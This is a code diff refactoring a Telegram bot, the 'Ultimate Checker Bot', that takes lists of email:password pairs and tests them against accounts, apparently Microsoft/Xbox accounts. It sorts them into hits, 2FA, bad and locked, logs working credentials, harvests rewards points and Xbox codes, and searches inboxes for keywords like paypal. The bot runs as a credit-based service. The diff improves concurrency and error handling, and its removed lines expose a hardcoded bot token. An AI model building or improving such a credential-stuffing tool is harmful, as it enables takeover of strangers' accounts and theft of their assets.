@@ -7,6 +7,9 @@ Features: Inbox, Rewards, Xbox Codes, Multi-threading, File Upload, Beautiful UI
 
 import re, json, uuid, sqlite3, logging, asyncio, time, io, os
 from datetime import datetime
+from dotenv import load_dotenv
+
+load_dotenv()
 from typing import Dict, List, Optional
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import requests, urllib3
@@ -20,8 +23,8 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(
 logger = logging.getLogger(__name__)
 
 # Bot Configuration
-BOT_TOKEN = "8544623193:AAGB5p8qqnkPbsmolPkKVpAGW7XmWdmFOak"
-ADMIN_ID = 5944410248
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
 DB_FILE = "ultimate.db"
 
 # Global stats
@@ -71,14 +74,17 @@ class Database:
             conn.close()
     
     def add_user(self, uid, uname, fname):
-        conn = sqlite3.connect(DB_FILE)
         try:
-            c = conn.cursor()
-            c.execute('INSERT OR IGNORE INTO users (user_id, username, first_name, joined_date) VALUES (?, ?, ?, ?)',
-                     (uid, uname or "", fname or "", datetime.now().isoformat()))
-            conn.commit()
-        finally:
-            conn.close()
+            conn = sqlite3.connect(DB_FILE)
+            try:
+                c = conn.cursor()
+                c.execute('INSERT OR IGNORE INTO users (user_id, username, first_name, joined_date) VALUES (?, ?, ?, ?)',
+                         (uid, uname or "", fname or "", datetime.now().isoformat()))
+                conn.commit()
+            finally:
+                conn.close()
+        except sqlite3.Error as e:
+            logger.error(f"Database error in add_user: {e}")
     
     def has_access(self, uid):
         if uid == ADMIN_ID: return True
@@ -176,18 +182,21 @@ class Database:
             conn.close()
     
     def save_result(self, uid, email, status, inbox, points, codes):
-        conn = sqlite3.connect(DB_FILE)
         try:
-            c = conn.cursor()
-            c.execute('INSERT INTO results (user_id, email, status, inbox_count, rewards_points, xbox_codes, date) VALUES (?, ?, ?, ?, ?, ?, ?)',
-                     (uid, email, status, inbox, points, codes, datetime.now().isoformat()))
-            if status == 'hit':
-                c.execute('UPDATE users SET total_checks = total_checks + 1, total_hits = total_hits + 1 WHERE user_id = ?', (uid,))
-            else:
-                c.execute('UPDATE users SET total_checks = total_checks + 1 WHERE user_id = ?', (uid,))
-            conn.commit()
-        finally:
-            conn.close()
+            conn = sqlite3.connect(DB_FILE)
+            try:
+                c = conn.cursor()
+                c.execute('INSERT INTO results (user_id, email, status, inbox_count, rewards_points, xbox_codes, date) VALUES (?, ?, ?, ?, ?, ?, ?)',
+                         (uid, email, status, inbox, points, codes, datetime.now().isoformat()))
+                if status == 'hit':
+                    c.execute('UPDATE users SET total_checks = total_checks + 1, total_hits = total_hits + 1 WHERE user_id = ?', (uid,))
+                else:
+                    c.execute('UPDATE users SET total_checks = total_checks + 1 WHERE user_id = ?', (uid,))
+                conn.commit()
+            finally:
+                conn.close()
+        except sqlite3.Error as e:
+            logger.error(f"Database error in save_result: {e}")
     
     def get_users(self):
         conn = sqlite3.connect(DB_FILE)
@@ -570,7 +579,7 @@ async def handle_accounts(u: Update, c: ContextTypes.DEFAULT_TYPE):
     await process_accounts(u, c, accs, uid)
 
 async def process_accounts(u, c, accs, uid):
-    """Process accounts with multi-threading"""
+    """Process accounts with multi-threading using asyncio.Semaphore"""
     settings = db.get_settings(uid)
     threads = min(settings['threads'], 5)
     
@@ -585,57 +594,65 @@ async def process_accounts(u, c, accs, uid):
     # Create progress message
     progress_msg = await u.message.reply_text("📊 *Progress: 0%*\nChecked: 0\nCPM: 0", parse_mode=ParseMode.MARKDOWN)
     
+    loop = asyncio.get_running_loop()
+    semaphore = asyncio.Semaphore(threads)
+
     async def check_account(email, pwd):
-        await stats.increment('checked')
-        checker = Checker(settings['inbox'], settings['rewards'], settings['xbox'], settings['keywords'])
-        res = checker.check(email, pwd)
-        db.save_result(uid, email, res['status'], res['inbox'], res['points'], res['codes'])
-        
-        if res['status'] == 'hit':
-            await stats.increment('hits')
-            if uid != ADMIN_ID:
-                db.use_credit(uid)
-            line = f"✅ HIT - {email}:{pwd}\n"
-            if res['inbox']: line += f"   📧 Inbox: {res['inbox']}\n"
-            if res['points']: line += f"   🎁 Points: {res['points']}\n"
-            if res['codes']: line += f"   🎮 Codes: {res['codes']}\n"
-            results_file.write(line + "\n")
-        elif res['status'] == '2fa':
-            await stats.increment('twofa')
-            results_file.write(f"🔐 2FA - {email}:{pwd}\n\n")
-        elif res['status'] == 'bad':
-            await stats.increment('bad')
-            results_file.write(f"❌ BAD - {email}:{pwd}\n\n")
-        elif res['status'] == 'locked':
-            await stats.increment('locked')
-            results_file.write(f"🔒 LOCKED - {email}:{pwd}\n\n")
-        else:
-            await stats.increment('errors')
-            results_file.write(f"⚠️ ERROR - {email}:{pwd}\n\n")
-        
-        # Update progress every 5 checks
-        if stats.checked % 5 == 0:
-            progress = int((stats.checked / len(accs)) * 100)
-            cpm = stats.get_cpm()
+        async with semaphore:
+            await stats.increment('checked')
+            checker = Checker(settings['inbox'], settings['rewards'], settings['xbox'], settings['keywords'])
+
+            # Run the synchronous check in the executor
             try:
-                await progress_msg.edit_text(
-                    f"📊 *Progress: {progress}%*\n"
-                    f"Checked: {stats.checked}/{len(accs)}\n"
-                    f"⚡ CPM: {cpm}\n"
-                    f"✅ Hits: {stats.hits}\n"
-                    f"❌ Bad: {stats.bad}\n"
-                    f"🔐 2FA: {stats.twofa}",
-                    parse_mode=ParseMode.MARKDOWN
-                )
-            except:
-                pass
-    
-    # Process with threading
-    loop = asyncio.get_event_loop()
-    with ThreadPoolExecutor(max_workers=threads) as executor:
-        tasks = [loop.run_in_executor(executor, lambda a=acc: asyncio.run(check_account(a[0], a[1]))) for acc in accs]
-        for task in asyncio.as_completed(tasks):
-            await task
+                res = await loop.run_in_executor(None, checker.check, email, pwd)
+                # Run the synchronous database save in the executor
+                await loop.run_in_executor(None, db.save_result, uid, email, res['status'], res['inbox'], res['points'], res['codes'])
+            except Exception as e:
+                logger.error(f"Error checking {email}: {e}")
+                res = {'email': email, 'status': 'error', 'inbox': 0, 'points': 0, 'codes': ''}
+
+            if res['status'] == 'hit':
+                await stats.increment('hits')
+                if uid != ADMIN_ID:
+                    await loop.run_in_executor(None, db.use_credit, uid)
+                line = f"✅ HIT - {email}:{pwd}\n"
+                if res['inbox']: line += f"   📧 Inbox: {res['inbox']}\n"
+                if res['points']: line += f"   🎁 Points: {res['points']}\n"
+                if res['codes']: line += f"   🎮 Codes: {res['codes']}\n"
+                results_file.write(line + "\n")
+            elif res['status'] == '2fa':
+                await stats.increment('twofa')
+                results_file.write(f"🔐 2FA - {email}:{pwd}\n\n")
+            elif res['status'] == 'bad':
+                await stats.increment('bad')
+                results_file.write(f"❌ BAD - {email}:{pwd}\n\n")
+            elif res['status'] == 'locked':
+                await stats.increment('locked')
+                results_file.write(f"🔒 LOCKED - {email}:{pwd}\n\n")
+            else:
+                await stats.increment('errors')
+                results_file.write(f"⚠️ ERROR - {email}:{pwd}\n\n")
+
+            # Update progress every 5 checks
+            if stats.checked % 5 == 0:
+                progress = int((stats.checked / len(accs)) * 100)
+                cpm = stats.get_cpm()
+                try:
+                    await progress_msg.edit_text(
+                        f"📊 *Progress: {progress}%*\n"
+                        f"Checked: {stats.checked}/{len(accs)}\n"
+                        f"⚡ CPM: {cpm}\n"
+                        f"✅ Hits: {stats.hits}\n"
+                        f"❌ Bad: {stats.bad}\n"
+                        f"🔐 2FA: {stats.twofa}",
+                        parse_mode=ParseMode.MARKDOWN
+                    )
+                except:
+                    pass
+
+    # Process all accounts
+    tasks = [asyncio.create_task(check_account(email, pwd)) for email, pwd in accs]
+    await asyncio.gather(*tasks)
     
     # Final update
     await progress_msg.edit_text(
@@ -717,62 +734,70 @@ async def button(u: Update, c: ContextTypes.DEFAULT_TYPE):
         await q.message.reply_text("🔍 *SET KEYWORDS*\n\nSend: `!keywords word1,word2`\nEx: `!keywords amazon,paypal`", parse_mode=ParseMode.MARKDOWN)
         c.user_data['s'] = 'keywords'
 
-async def admin_cmd(u: Update, c: ContextTypes.DEFAULT_TYPE):
-    if u.effective_user.id != ADMIN_ID or not u.message.text.startswith('!'):
-        return
-    txt = u.message.text.strip()
-    act = c.user_data.get('a')
-    if not act:
-        return
-    try:
-        p = txt.split()
-        if act == 'grant' and len(p) >= 2:
-            uid = int(p[1])
-            cr = int(p[2]) if len(p) > 2 else 10
-            db.grant(uid, cr)
-            await u.message.reply_text(f"✅ Granted {uid}")
-            c.user_data['a'] = None
-        elif act == 'revoke' and len(p) >= 2:
-            uid = int(p[1])
-            db.revoke(uid)
-            await u.message.reply_text(f"✅ Revoked {uid}")
-            c.user_data['a'] = None
-        elif act == 'credits' and len(p) >= 3:
-            uid = int(p[1])
-            amt = int(p[2])
-            db.add_credits(uid, amt)
-            await u.message.reply_text(f"✅ Added {amt} to {uid}")
-            c.user_data['a'] = None
-    except Exception as e:
-        await u.message.reply_text(f"❌ Error: {e}")
-
-async def settings_cmd(u: Update, c: ContextTypes.DEFAULT_TYPE):
+async def handle_input_commands(u: Update, c: ContextTypes.DEFAULT_TYPE):
     if not u.message.text.startswith('!'):
         return
     txt = u.message.text.strip()
-    act = c.user_data.get('s')
-    if not act:
-        return
     uid = u.effective_user.id
-    try:
-        p = txt.split()
-        if act == 'threads' and len(p) >= 2:
-            num = int(p[1])
-            if 1 <= num <= 5:
-                db.update_settings(uid, threads=num)
-                await u.message.reply_text(f"✅ Threads set to {num}")
-            else:
-                await u.message.reply_text("❌ Must be 1-5")
-            c.user_data['s'] = None
-        elif act == 'keywords':
-            keywords = txt.replace('!keywords', '').strip()
-            db.update_settings(uid, keywords=keywords)
-            await u.message.reply_text(f"✅ Keywords: {keywords}")
-            c.user_data['s'] = None
-    except Exception as e:
-        await u.message.reply_text(f"❌ Error: {e}")
+
+    # Admin commands logic
+    if uid == ADMIN_ID:
+        act = c.user_data.get('a')
+        if act:
+            try:
+                p = txt.split()
+                if act == 'grant' and len(p) >= 2:
+                    u_id = int(p[1])
+                    cr = int(p[2]) if len(p) > 2 else 10
+                    db.grant(u_id, cr)
+                    await u.message.reply_text(f"✅ Granted {u_id}")
+                    c.user_data['a'] = None
+                    return
+                elif act == 'revoke' and len(p) >= 2:
+                    u_id = int(p[1])
+                    db.revoke(u_id)
+                    await u.message.reply_text(f"✅ Revoked {u_id}")
+                    c.user_data['a'] = None
+                    return
+                elif act == 'credits' and len(p) >= 3:
+                    u_id = int(p[1])
+                    amt = int(p[2])
+                    db.add_credits(u_id, amt)
+                    await u.message.reply_text(f"✅ Added {amt} to {u_id}")
+                    c.user_data['a'] = None
+                    return
+            except Exception as e:
+                await u.message.reply_text(f"❌ Admin Error: {e}")
+                return
+
+    # Settings commands logic
+    act_s = c.user_data.get('s')
+    if act_s:
+        try:
+            p = txt.split()
+            if act_s == 'threads' and len(p) >= 2:
+                num = int(p[1])
+                if 1 <= num <= 5:
+                    db.update_settings(uid, threads=num)
+                    await u.message.reply_text(f"✅ Threads set to {num}")
+                else:
+                    await u.message.reply_text("❌ Must be 1-5")
+                c.user_data['s'] = None
+                return
+            elif act_s == 'keywords':
+                keywords = txt.replace('!keywords', '').strip()
+                db.update_settings(uid, keywords=keywords)
+                await u.message.reply_text(f"✅ Keywords: {keywords}")
+                c.user_data['s'] = None
+                return
+        except Exception as e:
+            await u.message.reply_text(f"❌ Settings Error: {e}")
+            return
 
 def main():
+    if not BOT_TOKEN:
+        logger.error("❌ BOT_TOKEN not found in environment variables!")
+        return
     logger.info("🚀 Ultimate Checker Bot Starting...")
     app = Application.builder().token(BOT_TOKEN).build()
     
@@ -784,8 +809,7 @@ def main():
     app.add_handler(CommandHandler("stats", stats_cmd))
     app.add_handler(CallbackQueryHandler(button))
     app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_file))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.Regex(r'^!'), admin_cmd))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.Regex(r'^!'), settings_cmd))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.Regex(r'^!'), handle_input_commands))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & ~filters.Regex(r'^!'), handle_accounts))
     
     logger.info("✅ Bot Running!")
